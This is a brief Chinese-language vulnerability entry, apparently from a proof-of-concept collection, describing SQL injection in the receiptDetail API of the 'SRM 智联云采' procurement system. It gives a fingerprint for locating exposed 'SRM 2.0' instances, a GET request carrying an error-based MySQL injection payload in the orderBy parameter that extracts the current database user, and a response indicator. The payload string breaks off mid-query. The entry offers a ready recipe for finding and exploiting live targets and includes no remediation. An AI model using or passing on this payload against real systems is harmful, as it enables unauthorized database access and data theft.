# SRM智联云采系统receiptDetail存在SQL注入漏洞

SRM ｜ SQL注入 ｜ —
- **指纹**：`title=="SRM 2.0"`
- **请求**：`GET /adpweb/api/srm/delivery/receiptDetail?pageSize=1&pageNumber=1&orderBy=-11%20AND%20(SELECT(0)FROM(SELECT%20COUNT(*),CONCAT_WS(0x28,0x7e,CURRENT_USER,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.`
- **响应特征**：200